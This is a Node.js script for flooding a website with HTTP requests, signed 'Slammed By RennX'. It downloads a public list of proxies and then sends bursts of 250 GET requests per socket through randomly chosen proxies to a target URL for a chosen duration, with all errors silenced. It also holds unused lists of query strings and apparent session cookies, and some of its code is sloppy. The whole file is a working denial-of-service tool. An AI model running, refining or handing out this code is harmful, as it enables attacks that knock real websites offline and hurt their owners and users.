process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
const net = require('net');
const fs = require('fs');
const url = require('url');
var path = require("path");
var https = require('https');
const execSync = require('child_process').execSync;
try {
    var colors = require('colors');
} catch (err) {
    console.log('\x1b[36mInstalling\x1b[37m the requirements');
    execSync('npm install colors');
    console.log('Done.');
    process.exit();
}
var fileName = __filename;
var file = path.basename(fileName);

const fileProxy = fs.createWriteStream("proxy.txt");
const requestProxys = https.get("https://sunny9577.github.io/proxy-scraper/generated/http_proxies.txt", function (responseProxys) {
    responseProxys.pipe(fileProxy);
    fileProxy.on("finish", () => {
        fileProxy.close();
        console.log("Proxys Download Completed");

        try {
            var proxies = fs.readFileSync('proxy.txt', 'UTF-8').toString().replace(/\r/g, '').split('\n');
        } catch (err) {
            if (err.code !== 'ENOENT') throw err;
            console.log('\x1b[31m Error\x1b[37m: Proxy list not found.');
            console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
            process.exit();
        }
        
        var target = process.argv[2];
        var parsed = url.parse(target);
        
        setTimeout(() => {
            process.exit(7);
        }, process.argv[4] * 1000);
        
        
        const UAs = 'useragents.json';
        
        setInterval(function() {
            var proxy = proxies[Math.floor(Math.random() * proxies.length)];
            proxy = proxy.split(':');
            var socket = net.connect(proxy[1], proxy[0]);
            socket.setKeepAlive(true, 5000)
            socket.setTimeout(5000);
            socket.once('error', err => {
                // console.log('Error : ' + proxy[0] + ":" + proxy[1]);
            });
            socket.once('disconnect', () => {
                console.log('Disconnect');
            });
            socket.once('data', data => {
                // console.log('Connected : ' + proxy[0] + ":" + proxy[1]);
            });
            for (let j = 0; j < 250; j++) {
                socket.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        var GD = [
            "/?r=*****",
            "/?r=12364",
            "/?r=16364",
            "/?r=65655",
            "/?r=65955",
            "/?r=14254",
            "/?r=12654",
            "/?r=66455",
            "/?r=18694",
            "/?r=12364",
            "/?r=6566664645",
            "/?r=125234",
            "/?r=16365",
            "/?r=16354",
            "/?r=123964",
            "/?r=656664645",
            "/?r=12524",
            "/?r=163665",
            "/?r=16354",
            "/?r=12334",
            "/?a=[+F10]&b=[+N5]",
            "/?a=[+F1]&b=[+N5]",
            "/?a=[+F130]&b=[+N52]",
            "/?a=[+F1042]&b=[+N52]",
            "/?a=[+F16685]&b=[+N5]",
            "/?a=[+F8551]&b=[+N5]",
            "/?a=[+F130]&b=[+N52]",
            "/?a=[+F1042]&b=[+N52]",
            "/?a=[+F10]&b=[+N5]",
            "/?a=[+F56551]&b=[+N5]",
            "/?a=[+F1350]&b=[+N52]",
            "/?a=[+F1520]&b=[+N52]",
            "/?uername=zlq&age=20",
            "/?uername=zlq&age=2",
            "/?yqlaje=an4ux1&amp;__CBK=3f3c8201870c33a8b8c92687ed8a1698d1603344084_326369&amp;wmnqjm=agpws2&amp;naxyty=jxxv22&amp;fktade=draxv1&amp;qybcjc=4pyt12&amp;vunwfk=dgwq82&qifuha=gk0u32",
            ];
        //        let KK = fs.readFileSync('baidu.txt', 'utf-8').match(/\S+/g);
        var KK = [
           "PHPSESSID=9vgqs235r45g9qfcpqcqikv86q; mysid=1cf6bb6e36491d53c0f9fc261cfbb792; counter=1; Hm_lvt_b4a4918d5abe40ec265dbc08481d477a=1603519390; Hm_lpvt_b4a4918d5abe40ec265dbc08481d477a=1603519390",
           "PHPSESSID=vj2qrg9j181qvdtavd8t8p7jd0; _ga=GA1.2.243460572.1603519150; _gid=GA1.2.729864228.1603519150; _gat=1",
           "c6c28a16698798d9ab69e5ac491ba86aextend_contents_views=852",
           "9WoS_2132_saltkey=zl3E3rvm; 9WoS_2132_lastvisit=1603425355; 9WoS_2132_lastact=1603428955%09forum.php%09; 9WoS_2132_onlineusernum=1",
           "c6c28a16698798d9ab69e5ac491ba86aextend_contents_views=852",
           ];
            }
        
            socket.on('data', function() {
                setTimeout(function() {
                    socket.destroy();
                    return delete socket;
                }, 130000);
            })
        }, 3);
        if (!process.argv[4]) {
            console.log("\x1b[31m Error\x1b[37m: provide time duration");
            console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
            process.exit();
        }
        if (!process.argv[4]) {
            console.log("\x1b[31m Error\x1b[37m: provide time duration");
            console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
            process.exit();
        }
        
        if (!process.argv[4]) {
            console.log("\x1b[31m Error\x1b[37m: provide time duration");
            console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
            process.exit();
        }
        
        if (isNaN(process.argv[4])) {
            console.log("\x1b[31m Error\x1b[37m: enter valid time duration");
            console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
            process.exit();
        }
        
        if (!process.argv[2] !== !process.argv[2].startsWith('http://') && !process.argv[2].startsWith('https://')) {
            console.log("\x1b[31m Error\x1b[37m: enter valid target");
            console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration>");
            process.exit();
        }
        
        console.log("Slammed By RennX".rainbow);
        console.log("\x1b[36mTarget\x1b[37m  %s | " + "\x1b[35m" + parsed.host + "\x1b[37m", process.argv[2]);    
    })
});









